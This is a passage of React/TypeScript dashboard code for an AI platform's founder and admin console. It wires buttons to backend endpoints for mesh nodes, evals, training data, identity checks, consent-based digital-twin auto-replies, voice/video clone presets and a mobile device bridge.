              <div style={{ display: "flex", justifyContent: "space-between", gap: 8, alignItems: "flex-start", flexWrap: "wrap" }}>
                <strong style={{ overflowWrap: "anywhere", wordBreak: "break-word" }}>{unit.name}</strong>
                <span style={{ fontSize: 12 }}>
                  {unit.kind} • {unit.registered ? "registered" : "not-registered"} • {unit.live ? "live" : "offline"}
                </span>
              </div>
              {!unit.live && (
                <div style={{ marginTop: 4, fontSize: 12, color: "#fecaca" }}>Cause: {unit.cause}</div>
              )}
            </button>
          ))}
        </div>
        <div style={{ ...log, marginTop: 8 }}>
          {selectedRuntimeUnit ? (
            <>
              <div style={{ fontWeight: 700 }}>
                {selectedRuntimeUnit.name} • {selectedRuntimeUnit.live ? "live" : "offline"}
              </div>
              <div style={{ marginTop: 4 }}>
                Root cause: {selectedRuntimeUnit.cause}
              </div>
              <div style={{ marginTop: 4 }}>
                Suggested fix: {selectedRuntimeUnit.suggestedFix}
              </div>
              {selectedRuntimeUnit.sourcePath ? (
                <div style={{ marginTop: 4, opacity: 0.85 }}>
                  Source path: {selectedRuntimeUnit.sourcePath}
                </div>
              ) : null}
            </>
          ) : (
            "Select any unit to inspect root cause and recommended fix."
          )}
        </div>
      </Card>
      <Card title="Future Feature Pipeline">
        {futureFeatures.map((f) => (
          <div key={f.id} style={log}>
            {f.name} • {f.phase} • {f.priority}
          </div>
        ))}
      </Card>
      <Card title="Backend Capabilities">
        <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
          <button style={chip} onClick={() => runBackendAction("GET:/system/status")}>System Status</button>
          <button style={chip} onClick={() => runBackendAction("GET:/status")}>Orchestrator Status</button>
          <button style={chip} onClick={() => runBackendAction("GET:/auth/whoami")}>Auth WhoAmI</button>
          <button style={chip} onClick={() => runBackendAction("GET:/mesh/nodes")}>Mesh Nodes</button>
          <button style={chip} onClick={() => runBackendAction("/mesh/register", { id: `dash-${Date.now()}`, baseUrl: "http://localhost:8095", kind: "dashboard", capabilities: ["infer"] })}>Mesh Register</button>
          <button style={chip} onClick={() => runBackendAction("/mesh/heartbeat", { id: "dash-node" })}>Mesh Heartbeat</button>
          <button style={chip} onClick={() => runBackendAction("/mesh/metrics", { id: "dash-node", latency_ms: 8, load: 0.2, cache_size: 5 })}>Mesh Metrics</button>
          <button style={chip} onClick={() => runBackendAction("/mesh/train-signal", { id: "dash-node", signal: { quality: "high", source: "dashboard" } })}>Mesh Train Signal</button>
          <button style={chip} onClick={() => runBackendAction("GET:/fed/model")}>Federated Model</button>
          <button style={chip} onClick={() => runBackendAction("/fed/sign", { payload: { id: "dash-sample", ts: Date.now() } })}>Federated Sign</button>
          <button style={chip} onClick={() => runBackendAction("/fed/update", { update: { id: "dash-sample", n_features: 3, classes: ["a"], coef: [[0,0,0]], intercept: [0] }, sig: "" })}>Federated Update</button>
          <button style={chip} onClick={() => runBackendAction("GET:/doctrine/rules")}>Doctrine Rules</button>
          <button style={chip} onClick={() => runBackendAction("/doctrine/rules", { id: `rule-${Date.now()}`, version: 1, enabled: true, category: "security", action: "block", pattern: "prompt injection", message: "Blocked by doctrine." })}>Doctrine Upsert</button>
          <button style={chip} onClick={() => runBackendAction("GET:/self-expansion/analyze")}>Self Expansion</button>
          <button style={chip} onClick={() => runBackendAction("/self-expansion/propose", { goal: "improve runtime observability and safety" })}>Expansion Propose</button>
          <button style={chip} onClick={() => runBackendAction("/self-expansion/generate-module", { name: "runtime_monitor", purpose: "monitor system health", path: "orchestrator/src/generated/runtime_monitor.ts", confirm: false })}>Generate Module (Preview)</button>
          <button style={chip} onClick={() => runBackendAction("GET:/training/samples?limit=20")}>Training Samples</button>
          <button style={chip} onClick={() => runBackendAction("/training/feedback", { query: "sample", response: "sample response", rating: "up", tags: ["dashboard"] })}>Training Feedback</button>
          <button style={chip} onClick={() => runBackendAction("GET:/training/export?limit=100")}>Training Export</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/evals/coverage")}>Eval Coverage</button>
          <button style={chip} onClick={() => runBackendAction("/admin/evals/run", { suite: "core" })}>Run Core Eval</button>
          <button style={chip} onClick={() => runBackendAction("/admin/evals/run-batch", { suites: ["core", "reasoning", "coding", "research"] })}>Run Eval Batch</button>
          <button style={chip} onClick={() => runBackendAction("/admin/redteam/run", {})}>Run Red-Team</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/reliability/overview?windowHours=24")}>Reliability Snapshot</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/retrieval/freshness?windowHours=72")}>Retrieval Freshness</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/trust/signals?windowHours=72")}>Trust Signals</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/trust/consistency?windowHours=72")}>Trust Consistency</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/quality/benchmark/trends?windowDays=30")}>Benchmark Trends</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/quality/benchmark/regression?windowDays=30")}>Benchmark Regression</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/sre/concurrency")}>SRE Concurrency</button>
          <button style={chip} onClick={() => runBackendAction("/admin/quality/hardening/run", {})}>Quality Hardening Run</button>
          <button style={chip} onClick={() => runBackendAction("GET:/billing/usage")}>Billing Usage</button>
          <button style={chip} onClick={() => runBackendAction("GET:/storage/state")}>Storage State</button>
          <button style={chip} onClick={() => runBackendAction("GET:/storage/events?limit=50")}>Storage Events</button>
          <button style={chip} onClick={() => runBackendAction("/storage/event", { type: "dashboard.event", payload: { source: "founder_console" } })}>Storage Append Event</button>
          <button style={chip} onClick={() => runBackendAction("GET:/idverse/status")}>IDVerse Status</button>
          <button style={chip} onClick={() => runBackendAction("GET:/neuroedge/user/identity?userId=u2")}>User Identity</button>
          <button style={chip} onClick={() => runBackendAction("/neuroedge/liveness-check", { userId: "u2", sessionId: `live-${Date.now()}` })}>Liveness Check</button>
          <button style={chip} onClick={() => runBackendAction("/neuroedge/biometric-match", { userId: "u2", referenceId: "ref-001" })}>Biometric Match</button>
          <button style={chip} onClick={() => exportOutputTxt("backend_output", backendOutput || "No backend output yet.")}>Export TXT</button>
          <button style={chip} onClick={() => exportOutputWord("backend_output", backendOutput || "No backend output yet.")}>Export Word</button>
          <button style={chip} onClick={() => printOutputPdf("Backend Output", backendOutput || "No backend output yet.")}>Export PDF</button>
          <button style={chip} onClick={() => setBackendOutput(null)}>Clear Output</button>
        </div>
        <div style={{ display: "grid", gap: 8, marginTop: 10 }}>
          <div style={{ display: "flex", gap: 8 }}>
            <select value={endpointMethod} onChange={(e) => setEndpointMethod(e.target.value as "GET" | "POST")} style={{ ...input, maxWidth: 110 }}>
              <option value="GET">GET</option>
              <option value="POST">POST</option>
            </select>
            <input value={endpointPath} onChange={(e) => setEndpointPath(e.target.value)} placeholder="/path" style={input} />
            <button style={primary} onClick={runEndpointConsole}>Run Endpoint</button>
          </div>
          {endpointMethod === "POST" && (
            <textarea
              value={endpointBody}
              onChange={(e) => setEndpointBody(e.target.value)}
              placeholder='{"key":"value"}'
              style={{ ...input, minHeight: 90, fontFamily: "ui-monospace, SFMono-Regular, Menlo, monospace" }}
            />
          )}
        </div>
        <pre style={{ ...log, whiteSpace: "pre-wrap", maxHeight: 240, overflow: "auto" }}>
          {backendOutput ? JSON.stringify(backendOutput, null, 2) : "No backend output yet."}
        </pre>
      </Card>
      <Card title="Twin Systems">
        <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
          <button style={chip} onClick={() => runTwinAction("/twin/scan")}>Twin Scan</button>
          <button style={chip} onClick={() => runTwinAction("/twin/analyze")}>Twin Analyze</button>
          <button style={chip} onClick={() => runTwinAction("/twin/evolve", { current_version: "1.0" })}>Twin Evolve</button>
          <button style={chip} onClick={() => runTwinAction("GET:/twin/report")}>Twin Report</button>
          <button style={chip} onClick={() => runTwinAction("/neurotwin/calibrate", { owner: "Joseph Were", tone: "direct", communication_style: "strategic", risk_appetite: "medium", goals: ["Scale NeuroEdge"], writing_samples: [] })}>NeuroTwin Calibrate</button>
          <button style={chip} onClick={() => runTwinAction("GET:/neurotwin/profile")}>NeuroTwin Profile</button>
          <button style={chip} onClick={() => runTwinAction("GET:/neurotwin/report")}>NeuroTwin Report</button>
          <button style={chip} onClick={() => exportOutputTxt("twin_output", twinOutput || "No twin output yet.")}>Export TXT</button>
          <button style={chip} onClick={() => exportOutputWord("twin_output", twinOutput || "No twin output yet.")}>Export Word</button>
          <button style={chip} onClick={() => printOutputPdf("Twin Output", twinOutput || "No twin output yet.")}>Export PDF</button>
          <button style={chip} onClick={() => setTwinOutput(null)}>Clear Output</button>
        </div>
        <div style={{ display: "grid", gap: 8 }}>
          <input
            value={twinQuestion}
            onChange={(e) => setTwinQuestion(e.target.value)}
            placeholder="Ask Twin: e.g. which image is used by floating chat and where is it?"
            style={input}
          />
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
            <input
              value={twinZipPath}
              onChange={(e) => setTwinZipPath(e.target.value)}
              placeholder="Optional server zip path: /home/.../project.zip"
              style={{ ...input, flex: 1, minWidth: 260 }}
            />
            <button style={primary} onClick={askTwin}>Ask Twin</button>
          </div>
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap", alignItems: "center" }}>
            <label style={chip}>
              <input
                type="checkbox"
                checked={twinIncludeAnalyze}
                onChange={(e) => setTwinIncludeAnalyze(e.target.checked)}
                style={{ marginRight: 6 }}
              />
              Include Analyze
            </label>
            <label style={chip}>
              <input
                type="checkbox"
                checked={twinIncludeReport}
                onChange={(e) => setTwinIncludeReport(e.target.checked)}
                style={{ marginRight: 6 }}
              />
              Include Report
            </label>
            <span style={muted}>
              Tier: {twinUploadTier} • Policy limit:{" "}
              {twinUploadTier === "founder" ? "100GB per zip" : twinUploadTier === "admin" ? "20GB per zip" : twinUploadTier === "paid" ? "5GB per zip" : "default"}
            </span>
          </div>
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
            <label style={chip}>
              Upload Files
              <input
                type="file"
                multiple
                style={{ display: "none" }}
                onChange={(e) => handleTwinUpload(e.target.files)}
              />
            </label>
            <label style={chip}>
              Upload Folder
              <input
                type="file"
                multiple
                // eslint-disable-next-line @typescript-eslint/ban-ts-comment
                // @ts-ignore non-standard but supported by Chromium
                webkitdirectory=""
                style={{ display: "none" }}
                onChange={(e) => handleTwinUpload(e.target.files)}
              />
            </label>
            <label style={chip}>
              Upload ZIP
              <input
                type="file"
                multiple
                accept=".zip,application/zip,application/x-zip-compressed"
                style={{ display: "none" }}
                onChange={(e) => handleTwinZipUpload(e.target.files)}
              />
            </label>
            <button
              style={chip}
              onClick={() => {
                setTwinUploadedFiles([]);
                setTwinUploadedZips([]);
              }}
            >
              Clear Uploaded
            </button>
            <span style={muted}>Uploaded files: {twinUploadedFiles.length}</span>
            <span style={muted}>Uploaded zips: {twinUploadedZips.length}</span>
          </div>
          <div style={{ marginTop: 8, fontWeight: 700 }}>Personal Twin Channels (Consent-Based)</div>
          <div style={muted}>
            Uses official provider APIs only, with explicit consent, disclosure, and approval controls.
          </div>
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
            <button style={chip} onClick={refreshTwinChannels}>Refresh Channels</button>
            <button style={chip} onClick={loadTwinMarketMap}>Market Map</button>
            <button style={chip} onClick={loadTwinAutoReplyLogs}>Auto-Reply Logs</button>
          </div>
          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(210px, 1fr))", gap: 8 }}>
            <select
              value={twinChannelDraft.channel}
              onChange={(e) => setTwinChannelDraft((p) => ({ ...p, channel: e.target.value }))}
              style={input}
            >
              <option value="phone_call">Phone Call</option>
              <option value="sms">SMS</option>
              <option value="whatsapp">WhatsApp</option>
              <option value="telegram">Telegram</option>
              <option value="email">Email</option>
              <option value="x">X</option>
              <option value="facebook">Facebook</option>
              <option value="instagram">Instagram</option>
              <option value="linkedin">LinkedIn</option>
            </select>
            <input
              value={twinChannelDraft.provider}
              onChange={(e) => setTwinChannelDraft((p) => ({ ...p, provider: e.target.value }))}
              placeholder="Provider (official_api)"
              style={input}
            />
            <input
              value={twinChannelDraft.handle}
              onChange={(e) => setTwinChannelDraft((p) => ({ ...p, handle: e.target.value }))}
              placeholder="Handle / phone / account id"
              style={input}
            />
            <input
              value={twinChannelDraft.display_name}
              onChange={(e) => setTwinChannelDraft((p) => ({ ...p, display_name: e.target.value }))}
              placeholder="Display name"
              style={input}
            />
          </div>
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap", alignItems: "center" }}>
            <label style={chip}>
              <input
                type="checkbox"
                checked={twinChannelDraft.consent_granted}
                onChange={(e) => setTwinChannelDraft((p) => ({ ...p, consent_granted: e.target.checked }))}
                style={{ marginRight: 6 }}
              />
              Consent Granted
            </label>
            <label style={chip}>
              <input
                type="checkbox"
                checked={twinChannelDraft.auto_reply_enabled}
                onChange={(e) => setTwinChannelDraft((p) => ({ ...p, auto_reply_enabled: e.target.checked }))}
                style={{ marginRight: 6 }}
              />
              Auto Reply Enabled
            </label>
            <button style={primary} onClick={connectTwinChannel}>Connect Channel</button>
          </div>
          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(210px, 1fr))", gap: 8 }}>
            <select value={twinAvailabilityMode} onChange={(e) => setTwinAvailabilityMode(e.target.value)} style={input}>
              <option value="active">Active</option>
              <option value="away">Away</option>
              <option value="ill">Ill</option>
              <option value="do_not_disturb">Do Not Disturb</option>
            </select>
            <input
              value={twinAvailabilityNotes}
              onChange={(e) => setTwinAvailabilityNotes(e.target.value)}
              placeholder="Availability note"
              style={input}
            />
            <button style={chip} onClick={setTwinAvailability}>Save Availability</button>
          </div>
          <div style={{ marginTop: 8, fontWeight: 700 }}>Auto-Reply Draft</div>
          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(210px, 1fr))", gap: 8 }}>
            <select
              value={twinAutoEventDraft.event_type}
              onChange={(e) => setTwinAutoEventDraft((p) => ({ ...p, event_type: e.target.value }))}
              style={input}
            >
              <option value="message">Message</option>
              <option value="phone_call">Phone Call</option>
            </select>
            <select
              value={twinAutoEventDraft.channel}
              onChange={(e) => setTwinAutoEventDraft((p) => ({ ...p, channel: e.target.value }))}
              style={input}
            >
              <option value="sms">SMS</option>
              <option value="whatsapp">WhatsApp</option>
              <option value="telegram">Telegram</option>
              <option value="email">Email</option>
              <option value="x">X</option>
            </select>
            <input
              value={twinAutoEventDraft.sender}
              onChange={(e) => setTwinAutoEventDraft((p) => ({ ...p, sender: e.target.value }))}
              placeholder="Sender / caller"
              style={input}
            />
            <input
              value={twinAutoEventDraft.incoming_text}
              onChange={(e) => setTwinAutoEventDraft((p) => ({ ...p, incoming_text: e.target.value }))}
              placeholder="Incoming message"
              style={input}
            />
          </div>
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap", alignItems: "center" }}>
            <button style={primary} onClick={draftTwinAutoReply}>Generate Draft Reply</button>
            <input
              value={twinApprover}
              onChange={(e) => setTwinApprover(e.target.value)}
              placeholder="Approver"
              style={{ ...input, maxWidth: 220 }}
            />
            <button style={chip} onClick={() => approveTwinAutoReply("approve_send")}>Approve & Send</button>
            <button style={chip} onClick={() => approveTwinAutoReply("reject")}>Reject</button>
          </div>
          {twinAutoReplyDraft && (
            <pre style={{ ...log, whiteSpace: "pre-wrap", maxHeight: 140, overflow: "auto" }}>
              {JSON.stringify(twinAutoReplyDraft, null, 2)}
            </pre>
          )}
          {twinChannelsBootstrap?.channels?.length ? (
            <div style={{ display: "grid", gap: 6 }}>
              <div style={{ fontWeight: 700 }}>Connected Channels</div>
              {twinChannelsBootstrap.channels.map((c: any) => (
                <div
                  key={c.id}
                  style={{
                    border: "1px solid var(--ne-border)",
                    background: "var(--ne-card)",
                    borderRadius: 10,
                    padding: 10,
                    display: "flex",
                    justifyContent: "space-between",
                    gap: 8,
                  }}
                >
                  <div>
                    <div style={{ fontWeight: 700 }}>{c.channel} • {c.handle}</div>
                    <div style={muted}>Provider: {c.provider} • Auto reply: {c.auto_reply_enabled ? "on" : "off"}</div>
                  </div>
                  <button
                    style={chip}
                    onClick={async () => {
                      await runTwinAction("/neurotwin/channels/disconnect", { id: c.id });
                      await refreshTwinChannels();
                    }}
                  >
                    Disconnect
                  </button>
                </div>
              ))}
            </div>
          ) : null}
          <div style={{ marginTop: 8, fontWeight: 700 }}>Provider Adapter Test Dispatch</div>
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
            <input
              value={twinSendChannelId}
              onChange={(e) => setTwinSendChannelId(e.target.value)}
              placeholder="channel id"
              style={{ ...input, maxWidth: 180 }}
            />
            <input
              value={twinSendTestMessage}
              onChange={(e) => setTwinSendTestMessage(e.target.value)}
              placeholder="Test message"
              style={{ ...input, flex: 1, minWidth: 240 }}
            />
            <button style={chip} onClick={sendTwinChannelTest}>Send Test</button>
          </div>
          <div style={{ marginTop: 8, fontWeight: 700 }}>Call Assistant (Permission-Based)</div>
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
            <button style={chip} onClick={loadTwinCallAssistantConfig}>Load Call Config</button>
            <button style={chip} onClick={saveTwinCallAssistantConfig}>Save Call Config</button>
          </div>
          {twinCallConfig ? (
            <div style={{ display: "grid", gap: 8 }}>
              <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
                <label style={chip}>
                  <input
                    type="checkbox"
                    checked={Boolean(twinCallConfig.enabled)}
                    onChange={(e) => setTwinCallConfig((p: any) => ({ ...(p || {}), enabled: e.target.checked }))}
                    style={{ marginRight: 6 }}
                  />
                  Enable Call Assistant
                </label>
                <label style={chip}>
                  <input
                    type="checkbox"
                    checked={Boolean(twinCallConfig.allow_phone_call_assist)}
                    onChange={(e) =>
                      setTwinCallConfig((p: any) => ({ ...(p || {}), allow_phone_call_assist: e.target.checked }))
                    }
                    style={{ marginRight: 6 }}
                  />
                  Phone Call Assist
                </label>
                <label style={chip}>
                  <input
                    type="checkbox"
                    checked={Boolean(twinCallConfig.allow_whatsapp_call_assist)}
                    onChange={(e) =>
                      setTwinCallConfig((p: any) => ({ ...(p || {}), allow_whatsapp_call_assist: e.target.checked }))
                    }
                    style={{ marginRight: 6 }}
                  />
                  WhatsApp Call Assist
                </label>
              </div>
              <div style={muted}>
                {String(twinCallConfig.platform_note || "")}
              </div>
            </div>
          ) : null}
          <div style={{ marginTop: 8, fontWeight: 700 }}>Clone Customization (Voice/Video Presets)</div>
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
            <button style={chip} onClick={loadTwinCloneCustomization}>Load Clone Profile</button>
            <button style={chip} onClick={saveTwinCloneCustomization}>Save Clone Profile</button>
          </div>
          <textarea
            value={twinCloneVoiceJson}
            onChange={(e) => setTwinCloneVoiceJson(e.target.value)}
            placeholder='[{"id":"voice-default","name":"Default Voice","asset_ref":"s3://..."}]'
            style={{ ...input, minHeight: 80, fontFamily: "ui-monospace, SFMono-Regular, Menlo, monospace" }}
          />
          <textarea
            value={twinCloneVideoJson}
            onChange={(e) => setTwinCloneVideoJson(e.target.value)}
            placeholder='[{"id":"video-default","name":"Default Video Persona","asset_ref":"s3://..."}]'
            style={{ ...input, minHeight: 80, fontFamily: "ui-monospace, SFMono-Regular, Menlo, monospace" }}
          />
          <textarea
            value={twinClonePresetsJson}
            onChange={(e) => setTwinClonePresetsJson(e.target.value)}
            placeholder='[{"id":"investor","label":"Investor Persona","tone":"strategic"}]'
            style={{ ...input, minHeight: 80, fontFamily: "ui-monospace, SFMono-Regular, Menlo, monospace" }}
          />
          <div style={{ marginTop: 8, fontWeight: 700 }}>Native Mobile Bridge (Android/iOS App Handoff)</div>
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
            <button style={chip} onClick={refreshMobileTwinBridge}>Refresh Bridge</button>
            <input
              value={mobileTwinDeviceDraft.id}
              onChange={(e) => setMobileTwinDeviceDraft((p) => ({ ...p, id: e.target.value }))}
              placeholder="Device ID"
              style={{ ...input, maxWidth: 180 }}
            />
            <select
              value={mobileTwinDeviceDraft.platform}
              onChange={(e) => setMobileTwinDeviceDraft((p) => ({ ...p, platform: e.target.value }))}
              style={{ ...input, maxWidth: 150 }}
            >
              <option value="android">Android</option>
              <option value="ios">iOS</option>
            </select>
            <input
              value={mobileTwinDeviceDraft.deviceName}
              onChange={(e) => setMobileTwinDeviceDraft((p) => ({ ...p, deviceName: e.target.value }))}
              placeholder="Device name"
              style={{ ...input, maxWidth: 200 }}
            />
            <button style={chip} onClick={registerMobileTwinDevice}>Register Device</button>
          </div>
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
            <input
              value={mobileTwinSyncDraft.deviceId}
              onChange={(e) => setMobileTwinSyncDraft((p) => ({ ...p, deviceId: e.target.value }))}
              placeholder="Sync deviceId"
              style={{ ...input, maxWidth: 180 }}
            />
            <input
              value={mobileTwinSyncDraft.pushToken}
              onChange={(e) => setMobileTwinSyncDraft((p) => ({ ...p, pushToken: e.target.value }))}
              placeholder="Push token"
              style={{ ...input, maxWidth: 220 }}
            />
            <label style={chip}>
              <input
                type="checkbox"
                checked={mobileTwinSyncDraft.permissionCallScreening}
                onChange={(e) => setMobileTwinSyncDraft((p) => ({ ...p, permissionCallScreening: e.target.checked }))}
                style={{ marginRight: 6 }}
              />
              Call Permission
            </label>
            <button style={chip} onClick={syncMobileTwinDevice}>Sync Device</button>
          </div>
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
            <input
              value={mobileTwinActionDraft.deviceId}
              onChange={(e) => setMobileTwinActionDraft((p) => ({ ...p, deviceId: e.target.value }))}
              placeholder="Action deviceId"
              style={{ ...input, maxWidth: 180 }}
            />
            <select
              value={mobileTwinActionDraft.actionType}
              onChange={(e) => setMobileTwinActionDraft((p) => ({ ...p, actionType: e.target.value }))}
              style={{ ...input, maxWidth: 220 }}
            >
              <option value="answer_phone_call">Answer Phone Call</option>
              <option value="answer_whatsapp_call">Answer WhatsApp Call</option>
              <option value="answer_video_call">Answer Video Call</option>
              <option value="sync_availability">Sync Availability</option>
            </select>
            <input
              value={mobileTwinActionDraft.payloadJson}
              onChange={(e) => setMobileTwinActionDraft((p) => ({ ...p, payloadJson: e.target.value }))}
              placeholder='{"reason":"user_away"}'
              style={{ ...input, flex: 1, minWidth: 260 }}
            />
            <button style={chip} onClick={enqueueMobileTwinAction}>Enqueue Action</button>
          </div>
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
            <input
              value={mobileTwinPendingDeviceId}
              onChange={(e) => setMobileTwinPendingDeviceId(e.target.value)}
              placeholder="Pending actions deviceId"
              style={{ ...input, maxWidth: 200 }}
            />
            <button style={chip} onClick={loadMobileTwinPending}>Load Pending</button>
            <input
              value={mobileTwinReceiptDraft.actionId}
              onChange={(e) => setMobileTwinReceiptDraft((p) => ({ ...p, actionId: e.target.value }))}
              placeholder="Receipt actionId"
              style={{ ...input, maxWidth: 200 }}
            />
            <input
              value={mobileTwinReceiptDraft.deviceId}
              onChange={(e) => setMobileTwinReceiptDraft((p) => ({ ...p, deviceId: e.target.value }))}
              placeholder="Receipt deviceId"
              style={{ ...input, maxWidth: 200 }}
            />
            <select
              value={mobileTwinReceiptDraft.status}
              onChange={(e) => setMobileTwinReceiptDraft((p) => ({ ...p, status: e.target.value }))}
              style={{ ...input, maxWidth: 150 }}
            >
              <option value="completed">Completed</option>
              <option value="failed">Failed</option>
            </select>
            <button style={chip} onClick={ackMobileTwinActionReceipt}>Ack Receipt</button>
          </div>
          {mobileTwinBridge ? (
            <pre style={{ ...log, whiteSpace: "pre-wrap", maxHeight: 140, overflow: "auto" }}>
              {JSON.stringify(
                {
                  devices: Array.isArray(mobileTwinBridge?.devices) ? mobileTwinBridge.devices.length : 0,
                  pendingActions: Array.isArray(mobileTwinBridge?.pendingActions) ? mobileTwinBridge.pendingActions.length : 0,
                  actionReceipts: Array.isArray(mobileTwinBridge?.actionReceipts) ? mobileTwinBridge.actionReceipts.length : 0,
                  policy: mobileTwinBridge?.policy || {},
                },
                null,
                2
              )}
            </pre>
          ) : null}
          {mobileTwinPendingActions.length ? (
            <pre style={{ ...log, whiteSpace: "pre-wrap", maxHeight: 140, overflow: "auto" }}>
              {JSON.stringify(mobileTwinPendingActions, null, 2)}
            </pre>
          ) : null}
          {twinMarketMap ? (
            <pre style={{ ...log, whiteSpace: "pre-wrap", maxHeight: 140, overflow: "auto" }}>
              {JSON.stringify(twinMarketMap, null, 2)}
            </pre>
          ) : null}
        </div>
        <pre style={{ ...log, whiteSpace: "pre-wrap", maxHeight: 240, overflow: "auto" }}>
          {twinOutput
            ? typeof twinOutput?.answer === "string"
              ? `${twinOutput.answer}\n\n${JSON.stringify(twinOutput, null, 2)}`
              : JSON.stringify(twinOutput, null, 2)
            : "No twin output yet."}
        </pre>
      </Card>
    </div>
  );

  const adminView = (
    <div style={grid}>
      {voiceOpsCopilotCard}
      {trainingStudioCard}
      {domainRegistryCard}
      {accessControlCard}
      {deviceProtectionCard}
      {aegisShieldCard}
      {creatorEngineCard}
      {cortexCoreCard}
      {artifactWorkspaceCard}
      {neuroExpansionBuilderCard}
      {computePayoutAdminCard}
      {loanOpsShieldCard}
      {reliabilityOpsCard}
      <Card title="Runtime Debug Matrix (Admin)" wide>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          {([
            ["kernel", `Kernel (${runtimeCounts.kernel})`],
            ["ml", `ML (${runtimeCounts.ml})`],
            ["orchestrator", `Orchestrator (${runtimeCounts.orchestrator})`],
            ["frontend", `Frontend modules (${runtimeCounts.frontend})`],
          ] as Array<[RuntimeDomain, string]>).map(([key, label]) => (
            <button key={key} style={{ ...(runtimeDomain === key ? primary : chip), minWidth: 170 }} onClick={() => setRuntimeDomain(key)}>
              {label}
            </button>
          ))}
          <button style={chip} onClick={loadRuntimeInventory}>
            {runtimeScanLoading ? "Scanning..." : "Scan Runtime (Twin)"}
          </button>
          <button style={chip} onClick={() => runRuntimeDiagnostics(runtimeDomain)}>Diagnostics</button>
          <button style={chip} onClick={() => runRuntimeAutoFix(runtimeDomain)}>Auto Fix</button>
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(4, minmax(110px, 1fr))", gap: 8, marginTop: 8 }}>
          <Stat label="Registered" value={String(runtimeSummary.registered)} />
          <Stat label="Live" value={String(runtimeSummary.live)} />
          <Stat label="Offline" value={String(runtimeSummary.offline)} />
          <Stat label="State" value={runtimeServiceState[runtimeDomain]} />
        </div>
        <div style={{ marginTop: 8, maxHeight: 320, overflowY: "auto", overflowX: "hidden", display: "grid", gap: 6, paddingRight: 4 }}>
          {(runtimeUnits[runtimeDomain] || []).slice(0, 80).map((unit) => (
            <button
              key={unit.id}
              style={{
                ...log,
                textAlign: "left",
                cursor: "pointer",
                width: "100%",
                minWidth: 0,
                whiteSpace: "normal",
                overflowWrap: "anywhere",
                wordBreak: "break-word",
              }}
              onClick={() => inspectRuntimeUnit(unit)}
            >
              {unit.name} • {unit.kind} • {unit.registered ? "registered" : "not-registered"} • {unit.live ? "live" : "offline"}
            </button>
          ))}
        </div>
        <div style={{ ...log, marginTop: 8 }}>
          {selectedRuntimeUnit
            ? `${selectedRuntimeUnit.name}: ${selectedRuntimeUnit.cause} | Fix: ${selectedRuntimeUnit.suggestedFix}`
            : "Select a unit to inspect cause and fix guidance."}
        </div>
      </Card>
      <Card title="Market Readiness (Admin)">
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={chip} onClick={refreshMarketReadiness}>Refresh</button>
          <button style={chip} onClick={saveMarketReadiness}>Save Controls</button>
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(2, minmax(180px, 1fr))", gap: 8, marginTop: 8 }}>
          <button style={chip} onClick={() => setMarketReadinessConfig((p) => ({ ...p, verifiedAnswerMode: !p.verifiedAnswerMode }))}>
            Verified Answer: {marketReadinessConfig.verifiedAnswerMode ? "on" : "off"}
          </button>
          <button style={chip} onClick={() => setMarketReadinessConfig((p) => ({ ...p, hitlRiskyActions: !p.hitlRiskyActions }))}>
            HITL Risk: {marketReadinessConfig.hitlRiskyActions ? "on" : "off"}
          </button>
          <button style={chip} onClick={() => setMarketReadinessConfig((p) => ({ ...p, deepResearchEnabled: !p.deepResearchEnabled }))}>
            Deep Research: {marketReadinessConfig.deepResearchEnabled ? "on" : "off"}
          </button>
          <select
            value={marketReadinessConfig.hybridRoutingMode}
            onChange={(e) =>
              setMarketReadinessConfig((p) => ({
                ...p,
                hybridRoutingMode: e.target.value as MarketReadinessConfig["hybridRoutingMode"],
              }))
            }
            style={input}
          >
            <option value="balanced">routing: balanced</option>
            <option value="mesh_first">routing: mesh_first</option>
            <option value="local_first">routing: local_first</option>
          </select>
        </div>
      </Card>
      <Card title="User Moderation">
        {users.map((u) => (
          <div key={u.id} style={row}>
            <span>{u.name} ({u.status})</span>
            <div style={{ display: "flex", gap: 6 }}>
              <button style={chip} onClick={() => updateUserStatus(u.id, u.status === "active" ? "review" : "active")}>
                {u.status === "active" ? "Flag" : "Restore"}
              </button>
              <button style={chip} onClick={() => assignRole(u.id, u.role === "admin" ? "moderator" : "admin")}>
                {u.role === "admin" ? "Demote" : "Promote"}
              </button>
            </div>
          </div>
        ))}
      </Card>
      <Card title="Offer Management">
        <input placeholder="Offer name" value={newOfferName} onChange={(e) => setNewOfferName(e.target.value)} style={input} />
        <input placeholder="Discount %" value={newOfferPct} onChange={(e) => setNewOfferPct(e.target.value)} style={input} />
        <button style={primary} onClick={addOffer}>Create Offer</button>
        {offers.map((o) => (
          <div key={o.id} style={row}>
            <span>{o.name} ({o.discountPct}% / {o.audience})</span>
            <div style={{ display: "flex", gap: 6 }}>
              <select
                value={o.audience}
